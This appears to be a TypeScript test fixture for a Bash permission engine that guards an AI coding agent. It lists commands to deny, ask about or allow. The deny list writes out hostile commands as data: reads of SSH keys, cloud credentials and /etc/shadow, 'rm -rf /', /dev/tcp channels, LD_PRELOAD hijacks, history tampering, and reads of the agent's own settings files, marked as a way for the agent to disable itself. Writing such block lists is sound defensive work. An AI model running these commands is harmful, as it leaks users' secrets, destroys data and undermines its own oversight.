// Filesystem-policy command fixtures: every table line is a literal Bash
// payload the engine must judge. Lint/assist are off for this folder.

export const DENY: string[] = [
  // Secrets tier — read or write, anywhere
  "cat .env",
  "cat .env.production",
  "tee .env.local",
  "cat ~/.ssh/id_rsa",
  "ls ~/.ssh",
  "cat ~/.aws/credentials",
  "cat ~/backup.pem",
  "cp secret.key /tmp/",
  "cat credentials.json",
  "cat token.json",
  "cat ~/terraform.tfstate",
  // Boundary: system files (there is no system tier — the zone boundary is
  // the gate; these only pin the reason quoting)
  "cat /etc/passwd",
  "cat /etc/shadow",
  "cat /etc/sudoers",
  "cat /etc/ssh/sshd_config",
  "cat /etc/hosts",
  "cat /proc/self/environ",
  "cat /proc/123/environ",
  // Settings tier (self-disable vector)
  "cat ~/.claude/settings.json",
  "cat ~/.claude.json",
  "cat .claude/settings.json",
  "cat .claude/settings.local.json",
  // Git internals: hooks are blocked at ANY reference — case-insensitively
  // (root APFS): .GIT/.Git spellings hit the same files
  "cat .git/hooks/pre-commit",
  "bash .git/hooks/pre-commit",
  "cp evil.sh .git/hooks/pre-commit",
  "cp evil.sh .GIT/hooks/pre-commit",
  "tee .Claude/settings.local.json x",
  // Boundary: outside $HOME ∪ projectRoot, reads AND writes deny
  "ls /etc",
  "cat /etc/group",
  "head /var/log/syslog",
  "tee /tmp/x y",
  "stat /opt/homebrew/Cellar",
  "cat /Users/stranger/Desktop/x",
  // Relative ..-chain escapes resolve LEXICALLY before classification —
  // normalize() collapses them, so this must land on /etc/passwd → deny
  // (guards against "optimizing away" the normalize call)
  "cat ../../../../../../etc/passwd",
  "cat ./../.././../..//etc/passwd",
  "cat ../../../var/log/syslog",
  "cat $HOME/../../etc/passwd",
  // $-expansion bypasses: name boundary + operator spellings + unresolvable
  // variables in path-shaped tokens
  "cat $HOMEevil/etc/passwd",
  "cat ${HOME:0}/.ssh/id_rsa",
  "cp x ${HOME^}secret",
  "cat ${HOME}secret",
  "cat ~/dest/$UNKNOWN/x",
  // embedded-path tokens: @-strip and --flag=value decomposition
  "tar --file=/tmp/x.tar -c .",
  // case-residual basenames
  "cat ~/.CLAUDE.json",
  "cat credentials.JSON",
  // braced-var escapes + tilde-user
  "cat ${HOMEPATH}/etc/passwd",
  "tee ${HOMEPATH}/evil x",
  "cat ${HOMEBREW_PREFIX}/etc/openssl.cnf",
  "cat ${HOME:0:1}/etc/passwd",
  "cat ~root/secret.txt",
  "cat ~root/.zshrc",
  "cat ~-/etc/passwd",
  // macOS tiers: ~/Library full deny
  "cat ~/Library/Keychains/login.keychain",
  "cat ~/Library/Safari/History.db",
  "tee ~/Library/Preferences/x x",
  // boundary robustness pins: case-insensitive APFS + firmlink spelling
  "cat /ETC/PASSWD",
  "tee /System/Volumes/Data/private/tmp/x y",
  // Scope rules: filesystem root and home-whole writes/deletes deny
  "rm -rf /",
  // the filesystem root is denied for ANY intent, reads included — pinned
  // so it cannot drift into an accidental allow
  "ls /",
  "cat /",
  "du -sh /",
  "rm -rf ~/",
  "rm -rf $HOME",
  // PATH rule: run commands by name, not absolute path
  "/opt/homebrew/bin/biome check .",
  "/bin/ls",
  // system writes land on the boundary
  "rm -rf /usr/local/thing",
  "chmod -R 777 /etc",
  "tee /etc/motd x",
  // redirects are targets too
  "ls >> /var/tmp/out",
  "cat < /etc/hosts",
  // wrapper-carried intent — including options/assignments between the
  // wrapper and the command
  "sudo rm -rf /",
  "env tee /etc/motd x",
  "env X=1 tee .git/config x",
  "env X=1 sudo tee ~/.zshrc x",
  "env -u X sudo tee .git/config x",
  "timeout 10 rm -rf ~",
  "nice -n 5 cp x ~/Desktop/",
  "xargs -I{} rm ~/.zshrc",
  // git-config + personal-config writes
  "tee .git/config x",
  "echo x > .git/config",
  "tee ~/.zshrc x",
  "cp dotfiles/zshrc ~/.bashrc",
  // sudo blanket rule: any use, even via wrapper chains
  "sudo ls",
  "env sudo tee /etc/motd x",
  // network blanket rule: the tool name alone denies — wrappers and flags
  // make no difference
  "curl https://x",
  "wget https://x/y",
  "env curl https://x",
  "ssh host",
  "scp f host:",
  "nc -z host 22",
  "ping example.com",
  "dig example.com",
  "host example.com",
  "nslookup example.com",
  "whois example.com",
  "openssl s_client -connect host:443",
  // macOS personal folders: writes/deletes
  "tee ~/Movies/clip.mp4 x",
  "rm ~/Desktop/notes.txt",
  "cp x ~/Downloads/",
  "cp x ~/Applications/",
  // glued short-flag values ride the flag with no separator
  "tar -C/etc -c .",
  // glued -C= escapes
  "tar -C=/etc -c .",
  // conscious cost of the `;` truncation of `=`-pair values (curl's -F
  // field syntax is the model): a literal `;` inside a path-ish value is
  // read as syntax, so this denies as `.env`
  'cat "--flag=.env;x"',
  // deny-union: the `;` truncation masks tail-borne evidence — each pin
  // carries its evidence ONLY in the tail the truncated candidate drops
  // ($VAR fail-closed, secret suffix, ..-climb out of the project zone)
  'cat "--flag=x;id_rsa.key"',
  'cat "--flag=/proj/x;../../../etc/passwd"',
  // mid-token =@: the tail hides after an `=@` on a NON-@ pair value
  "cat a=b=@/etc/passwd",
  'cat "f=x=@/etc/passwd;type=y"',
  // substitutions: whole-word substitutions ride their walked inner units,
  // so the /etc form denies on the inner unit
  "echo $(cat /etc/passwd)",
  // injection/obfuscation: network builtins, loader hijack, history tampering
  "echo x > /dev/tcp/10.0.0.1/8080",
  "exec 3<>/dev/tcp/host/80",
  "cat /dev/udp/10.0.0.1/53",
  "LD_PRELOAD=/tmp/evil.so ls",
  "LD_LIBRARY_PATH=/tmp ls",
  "PATH=/tmp/bad ls",
  "HISTFILE=/dev/null ls",
  "cat .bash_history",
  "HISTSIZE=0 ls",
  // severity: a deny anywhere on the line beats an earlier ask — the ask
  // would shadow it (and under bypassPermissions auto-allow it)
  "ls ~; cat /etc/passwd",
  "ls ~ && cat ~/.ssh/id_rsa",
  "ls ~; curl example.com",
  "ls ~ > /tmp/x",
  "ls ~ /etc/passwd",
  // the same shadow inside ONE token's candidates: the `;`-truncated
  // candidate asks (~/read) while the full token's tilde-user tail denies
  'grep "--flag=~;/etc/passwd"',
  // unit names pass the same fail-closed gates as path candidates
  "$EVIL/tool args",
  "~root/evil.sh args",
  // sudo ban — directly and behind wrappers (time/parallel were a bypass)
  "sudo rm -rf /tmp/x",
  "xargs sudo rm x",
  "time sudo rm x",
  "parallel sudo rm x",
];

// Home-whole reads ask: the only ask rows
export const ASK: string[] = [
  "find ~ -name x", // read on home as a whole
  "ls ~",
];

export const ALLOW: string[] = [
  // Ordinary daily work.
  // NOTE: `cat ../../README.md` is NOT here — the /proj harness default is
  // not HOME-anchored, so it boundary-denies. The repo-in-$HOME scenario
  // it represents is pinned by an explicit context test below.
  "cat ~/notes/project-idea.txt",
  "tee ~/notes/new-file x", // write inside $HOME, non-tier
  "cat file.txt",
  "cat file 2>/dev/null", // safe-device exemption
  "ls -la",
  // PersonalConfig: reads are fine anywhere
  "cat ~/.zshrc",
  "cat ~/.gitconfig",
  // .git/config: reads are fine
  "cat .git/config",
  // macOS personal folders: reads pass
  "cat ~/Documents/report.pdf",
  "ls ~/Downloads",
  // clean ${HOME}/$HOME anchor forms
  "cat ${HOME}/notes/x",
  "cat $HOME/notes/x",
  "head -c 64 /dev/urandom",
  // project-zone and home non-tier work
  "rm -rf ./build",
  "tee src/out.txt x",
  "mkdir build",
  "rm ~/notes/old.txt", // delete inside $HOME, non-tier
  // prose path mentions must pass
  "echo foo=/etc",
  // substitutions: whole-word substitutions ride their walked inner units
  "echo $(git log --oneline)",
  // glob payloads are not path candidates
  "ls **",
  'ls "*"',
  // pipe-to-exec is no-inline-scripts' row — filesystem stays null here
  "cat x | tee build/y",
  // legit PATH merge keeps $PATH
  "PATH=$PATH:/usr/local/bin ls",
];
